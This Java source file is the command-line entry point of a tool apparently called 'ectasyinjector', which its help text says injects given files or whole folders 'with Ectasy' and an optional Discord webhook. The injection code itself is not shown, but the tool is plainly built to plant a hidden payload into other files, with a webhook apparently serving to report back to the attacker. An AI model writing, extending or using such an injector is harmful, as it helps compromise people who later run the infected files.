package lol.nikko.ectasyinjector;

import lol.nikko.ectasyinjector.inject.FileInjector;
import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.ArgumentParser;
import net.sourceforge.argparse4j.inf.ArgumentParserException;
import net.sourceforge.argparse4j.inf.Namespace;

import java.io.File;
import java.util.List;

public class Main {
    public static void main(String[] args) throws Throwable {
        ArgumentParser parser = ArgumentParsers.newFor("injector").build()
                .defaultHelp(true)
                .description("Inject given file(s)/all files in folder(s) with Ectasy and a discord webhook (if one is provided)");

        parser.addArgument("-d", "--debug")
                .required(false).setDefault(false)
                .type(Boolean.class)
                .help("Enable debug mode (prints stack traces)");

        parser.addArgument("-w", "--webhook")
                .required(false)
                .help("The webhook to inject");

        parser.addArgument("-f", "--files")
                .required(true)
                .type(Arguments.fileType().verifyCanRead())
                .nargs("+")
                .help("A list of files to inject");

        Namespace namespace = null;
        try {
            namespace = parser.parseArgs(args);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
        }

        boolean debug = namespace.getBoolean("debug");
        String webhook = namespace.getString("webhook");
        List<File> files = namespace.getList("files");

        Injector injector = new Injector(debug, webhook, files);
        injector.inject();
    }
}